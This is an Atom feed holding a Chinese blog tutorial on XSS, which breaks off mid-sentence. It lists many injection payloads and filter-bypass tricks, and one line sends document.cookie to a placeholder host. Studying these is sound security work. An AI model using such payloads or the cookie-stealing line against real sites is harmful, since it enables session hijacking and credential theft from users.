<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-04-15T15:30:54.255Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>XSS</title>
    <link href="http://example.com/2024/04/15/XSS/"/>
    <id>http://example.com/2024/04/15/XSS/</id>
    <published>2024-04-15T11:22:43.000Z</published>
    <updated>2024-04-15T15:30:54.255Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss"><a class="markdownIt-Anchor" href="#xss">#</a> XSS</h1><h2 id="跨站脚本攻击"><a class="markdownIt-Anchor" href="#跨站脚本攻击">#</a> 跨站脚本攻击</h2><p>网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web 应用程序能够输出相应的内容。动态站点会受到一种名为 “跨站脚本攻击”（Cross Site Scripting，安全专家们通常将其缩写成 XSS, 原本应当是 css，但为了和层叠样式表（Cascading Style Sheet,CSS）有所区分，故称 XSS，而静态站点则完全不受其影响。XSS 的运行原理是将恶意的 script 脚本插入进 html/css/js 文件当中，恶意攻击者会在 Web 页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。</p><p>跨站脚本攻击是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用 xss 代码攻击成功后，可能得到很高的权限、私密网页内容、会话和 cookie 等各种内容</p><p>攻击者利用 XSS 漏洞旁路掉访问控制 —— 例如同源策略 (same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼 (Phishing) 攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的 “缓冲区溢出攻击”，而 JavaScript 是新型的 “ShellCode”。</p><p>xss 漏洞通常是通过 php 的输出函数将 javascript 代码输出到 html 页面中，通过用户本地浏览器执行的，所以 xss 漏洞关键就是<strong>寻找参数未过滤的输出函数。</strong></p><p>例如以下代码：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>代码未对可控制参数做任何过滤，此时就可以利用 x 构建恶意 js 代码获取一定的信息，测试一下 <code>?x=&lt;script&gt;alert(1)&lt;script&gt;</code></p><p>此时是页面会弹出 <code>1</code> ：</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/sXjQ6w35zbWBAut.png" alt="image.png"></p><p>xss 漏洞一般是在前端，对用户输入的内容缺少过滤，当用户构造恶意的 script 语句时，就有可能泄露信息，用户可以利用 php 中的输出函数（常见的输出函数有： <code>print</code> 、 <code>print_r</code> 、 <code>echo</code> 、 <code>printf</code> 、 <code>sprintf</code> 、 <code>die</code> 、 <code>var_dump</code> 、 <code>var_export</code> ）来获取敏感信息</p><p>危害影响：</p><blockquote><ul><li>盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</li><li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li><li>盗窃企业重要的具有商业价值的资料</li><li>非法转账</li><li>强制发送电子邮件</li><li>网站挂马</li><li>控制受害者机器向其它网站发起攻击</li></ul></blockquote><p>其实归根结底，XSS 的攻击方式就是想办法 “教唆” 用户的浏览器去执行一些这个网页中原本不存在的前端代码。可问题在于尽管一个信息框突然弹出来并不怎么友好，但也不至于会造成什么真实伤害啊。的确如此，但要说明的是，这里拿信息框说事仅仅是为了举个栗子，真正的黑客攻击在 XSS 中除非恶作剧，不然是不会在恶意植入代码中写上 alert (“say something”) 的。在真正的应用中，XSS 攻击可以干的事情还有很多</p><p><strong>1. 窃取网页浏览中的 cookie 值</strong></p><p>在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个 cookie 值。这个 cookie 值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。如果你的 cookie 值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过 script 脚本获得当前页面的 cookie 值，通常会用到 cookie</p><p><strong>2. 劫持流量实现恶意跳转</strong></p><p>这个很简单，就是在网页中想办法插入一句像这样的语句： <script>window.location.href=“<a class="link"   href="http://www.baidu.com" >http://www.baidu.com <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>”;</script>那么所访问的网站就会被跳转到百度的首页。早在 2011 年新浪就曾爆出过严重的 xss 漏洞，导致大量用户自动关注某个微博号并自动转发某条微博。</p><p>常出现场景：文章发表、评论、留言、注册资料的地方、修改资料的地方等</p><p>XSS 可以分为反射型、存储型、DOM 型</p><h3 id="反射型xss"><a class="markdownIt-Anchor" href="#反射型xss">#</a> 反射型 XSS</h3><p>非持久化</p><p>（1）原理<br>  反射型 xss 又称非持久型 xss，是目前最普遍的类型，这种攻击方式往往具有一次性，危害相对较小，但是方便攻击者构造。发出请求时，XSS 代码出现在 URL 中，作为输入提交到服务器端，服务器端解析后响应，XSS 代码随响应内容一起传回给浏览器，最后浏览器解析执行 XSS 代码。这个过程像一次反射，所以称反射型 XSS。</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/HRqcBeglPQzE4hF.png" alt="image.png"></p><p>（2）攻击方式<br>  攻击者通过电子邮件等方式将包含 xss 代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有 xss 代码的数据发送给目标用户的浏览器，浏览器解析这段带有 xss 代码的恶意脚本后就会触发 xss 漏洞</p><p>在判断是否有能利用的 XSS 时，一般需要判断网站过滤了什么字符，然后进行代码注入：<br>面对输入框，先输入 <code>1</code> :</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/JTeYCBVtnUSkmau.png" alt="image.png"></p><p>然后查看源代码，找到输入的 <code>1</code>  出现在什么地方：<br><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/FkWQ7DNZUM1KVHA.png" alt="image.png"></p><p>插入代码： <code>&quot;&gt;&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt;</code></p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/xBlZRjIoMrLXdSp.png" alt="image.png"></p><p>注入成功；</p><p><code>&quot;&gt;&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt;</code>  中 <code>&quot;&gt;</code>  闭合了前面的语句，后面 <code>&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt;</code>  是实际利用漏洞达到目的的语句</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/Djbq3zoIdWvgwyY.png" alt="image.png"></p><h3 id="存储型xss"><a class="markdownIt-Anchor" href="#存储型xss">#</a> 存储型 XSS</h3><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/v8CzH1lJwTtGfe7.png" alt="image.png"></p><p>（1）原理<br>  存储型 XSS 和反射型 XSS 的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交 XSS 代码，会长期存在并有效。最典型的例子就是留言板 XSS，用户提交一条包含 XSS 代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了 XSS 攻击</p><p>（2）攻击方式<br>  这种攻击多见于论坛、博客和留言板中，攻击者在发帖的过程中，将恶意脚本连同正常的信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久的存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在它们的浏览器中得到执行</p><h3 id="dom型xss"><a class="markdownIt-Anchor" href="#dom型xss">#</a> DOM 型 XSS</h3><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/djA6KrPy3e4OtcU.png" alt="image.png"></p><p>（1）原理<br>  文档对象模型 Document Object Model（DOM）是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分</p><p>DOM 型 xss 其实是一种特殊类型的反射型 xss，也被称作本地跨站，它是基于 DOM 文档对象模型的一种漏洞。DOM XSS 和反射型 XSS、存储型 XSS 的区别在于 DOM XSS 代码并不需要服务器参与，出发 XSS 靠的是浏览器的 DOM 解析，完全是客户端的事情</p><p>DOM 中有很多对象，其中一些对象可以被用户所操纵，如 url，location 等。客户端的脚本程序可以通过 DOM 来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得 DOM 中的数据后并在本地执行，因此仅从服务器端是没有办法防御 DOM 型 XSS 漏洞的，如若 DOM 中的数据没有经过严格的验证，便会产生基于 DOM 的 XSS 漏洞。</p><p>基于 DOM 的 XSS 是反射的特例，其中 JavaScript 隐藏在 URL 中，并在其呈现时由页面中的 JavaScript 取出，而不是在提供服务时嵌入到页面中。这可以使其比其他攻击更隐蔽，并且监控页面正文的 WAF 或其他防护检测不出恶意内容。</p><p>（2）攻击方式<br>  用户请求一个经过专门设计的 URL，它由攻击者提交，而且其中包含 xss 代码。服务器的响应不会以任何的形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM 对象就会处理 xss 代码，导致存在 xss 漏洞</p><h3 id="使用js代码获取cookie"><a class="markdownIt-Anchor" href="#使用js代码获取cookie">#</a> 使用 JS 代码获取 Cookie</h3><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">var</span> img=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);img.<span class="property">src</span>=<span class="string">&quot;http://xxxx/a?&quot;</span>+<span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);&lt;script&gt;</span><br></pre></td></tr></table></figure></div><h3 id="获取session"><a class="markdownIt-Anchor" href="#获取session">#</a> 获取 session</h3><p>有的时候获取了 Cookie，但是少了 Session，会造成登不进后台，服务器开启了 Session 验证的话，我们只获取客户端的 Cookie 是没有办法通过验证的，而且我们也无法获取存放在服务端的 Session。如果需要获取 Session，可以借助辅助文件，比如访问 php 探针时就会携带 Session</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/yRmvSg7rsHIXkQh.png" alt="image.png"></p><p>想办法进入 phpinfo ()</p><p>利用 beef 进行页面跳转</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/UZmWoGfNuz64Sxd.png" alt="image.png"></p><p>获取页面源码</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/jcwyR6NYOaZg7ld.png" alt="image.png"></p><h3 id="httponly"><a class="markdownIt-Anchor" href="#httponly">#</a> HttpOnly</h3><p>如果 Cookie 中设置了 HttpOnly 属性，那么通过 JS 脚本将无法读取到 Cookie 信息，这样能有效防止 XSS 攻击，窃取 Cookie 内容。 但是还是存在 xss 跨站语句，阻止的仅仅是获取 cookie</p><p>各种主流语言都支持 HttpOnly</p><h3 id="反制httponly"><a class="markdownIt-Anchor" href="#反制httponly">#</a> 反制 HttpOnly</h3><p>当对方开启 HttpOnly 时，盗取 cookie 就会失败。登录后台的方式有 Cookie 登录和账号密码登录</p><p>（1）Cookie 形式<br>（2）直接账号密码登录</p><p>① 读取保存账号密码<br>  通过窃取保存在本地的数据（账号密码）来登录后台（需要 xss 产生于登录地址，利用表单劫持）</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/gBu43eYEGRdqSVX.png" alt="image.png"></p><p>type、id、name 通过查看网站源代码中的登录框表单</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/hk6GDgcZiR5MU49.png" alt="image.png"></p><p>② 读取没保存账号密码</p><p>通过表单（登录框）劫持数据（产生在后台的 XSS，例如存储型 XSS 留言等）</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/Csrn7KIPulTvi5M.png" alt="image.png"></p><p>劫持原理：抓取数据包另外发送一份到跨站平台</p><p><img lazyload src="/images/loading.svg" data-src="https://s2.loli.net/2024/04/15/ELwHWCM3kAbQiTl.png" alt="image.png"></p><p>但是如果是 https 网站的话，数据是进行了 ssl 加密，获取了数据之后也是很难读取到账号密码的，鸡肋方法</p><h2 id="一些常见标签"><a class="markdownIt-Anchor" href="#一些常见标签">#</a> 一些常见标签</h2><p><code>&lt;script&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scirpt</span>&gt;</span>alert(&quot;xss&quot;);<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;img&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">XSS</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;input&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#竞争焦点，从而触发onblur事件</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onblur</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;) <span class="attr">autofocus</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;details&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">ontoggle</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#使用open属性触发ontoggle事件，无需用户去触发</span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">open</span> <span class="attr">ontoggle</span>=<span class="string">&quot;alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;svg&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;select&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line">#通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;ifrme&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;video&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;audio&gt;</code></p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span>  <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;body&gt;</code></p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=alert(<span class="string">&quot;xss&quot;</span>);&gt;</span><br></pre></td></tr></table></figure></div><p>利用换行符以及 autofocus，自动去触发 onscroll 事件，无需用户去触发</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span></span></span><br><span class="line"><span class="tag"><span class="attr">onscroll</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;textarea&gt;</code></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">onfocus</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;); <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;keygen&gt;</code></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">keygen</span> <span class="attr">autofocus</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span>&gt;</span> //仅限火狐</span><br></pre></td></tr></table></figure></div><p><code>&lt;marquee&gt;</code></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span><span class="tag">&lt;/<span class="name">marquee</span>&gt;</span> //Chrome不行，火狐和IE都可以</span><br></pre></td></tr></table></figure></div><p><code>&lt;isindex&gt;</code></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">isindex</span> <span class="attr">type</span>=<span class="string">image</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>//仅限于IE</span><br></pre></td></tr></table></figure></div><p>利用 link 远程包含 js 文件</p><p><strong>PS：在无 CSP 的情况下才可以</strong></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">import</span> <span class="attr">href</span>=<span class="string">&quot;http://127.0.0.1/1.js&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="javascript伪协议"><a class="markdownIt-Anchor" href="#javascript伪协议">#</a> javascript 伪协议</h3><p><a>标签</a></p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(`xss`);&quot;</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;iframe&gt;</code>  标签</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">xss</span>&#x27;);&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;img&gt;</code>  标签</p><div class="highlight-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert(<span class="string">&#x27;xss&#x27;</span>)&gt;<span class="comment">//IE7以下</span></span><br></pre></td></tr></table></figure></div><p><code>&lt;form&gt;</code>  标签</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;Javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="其它"><a class="markdownIt-Anchor" href="#其它">#</a> 其它</h3><p><code>expression</code>  属性</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img style=<span class="string">&quot;xss:expression(alert(&#x27;xss&#x27;&#x27;))&quot;</span>&gt; <span class="comment">// IE7以下</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color:rgb(&#x27;&#x27;�x:expression(alert(1))&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span> <span class="comment">//IE7以下</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"><span class="selector-id">#test</span>&#123;x:<span class="built_in">expression</span>(<span class="built_in">alert</span>(/XSS/))&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span> <span class="comment">// IE7以下</span></span><br></pre></td></tr></table></figure></div><p><code>background</code>  属性</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">background</span>=<span class="string">javascript:alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span> //在Opera 10.5和IE6上有效</span><br></pre></td></tr></table></figure></div><h2 id="绕过过滤"><a class="markdownIt-Anchor" href="#绕过过滤">#</a> 绕过过滤</h2><h3 id="1空格"><a class="markdownIt-Anchor" href="#1空格">#</a> 1. 空格</h3><p>用 <code>/</code>  代替空格:  <code>&lt;img/src=&quot;x&quot;/onerror=alert(&quot;xss&quot;);&gt;</code></p><h3 id="2过滤关键词"><a class="markdownIt-Anchor" href="#2过滤关键词">#</a> 2. 过滤关键词</h3><h4 id="大小写绕过"><a class="markdownIt-Anchor" href="#大小写绕过">#</a> 大小写绕过</h4><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ImG</span> <span class="attr">sRc</span>=<span class="string">x</span> <span class="attr">onerRor</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="双写关键字"><a class="markdownIt-Anchor" href="#双写关键字">#</a> 双写关键字</h4><p>有些 waf 可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">imimgg</span> <span class="attr">srsrcc</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;);&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="字符拼接"><a class="markdownIt-Anchor" href="#字符拼接">#</a> 字符拼接</h4><h5 id="利用eval"><a class="markdownIt-Anchor" href="#利用eval">#</a> 利用 eval</h5><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h5 id="利用top"><a class="markdownIt-Anchor" href="#利用top">#</a> 利用 top</h5><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">top[<span class="string">&quot;al&quot;</span>+<span class="string">&quot;ert&quot;</span>](<span class="string">`xss`</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="其它字符混淆"><a class="markdownIt-Anchor" href="#其它字符混淆">#</a> 其它字符混淆</h4><p>有的 waf 可能是用正则表达式去检测是否有 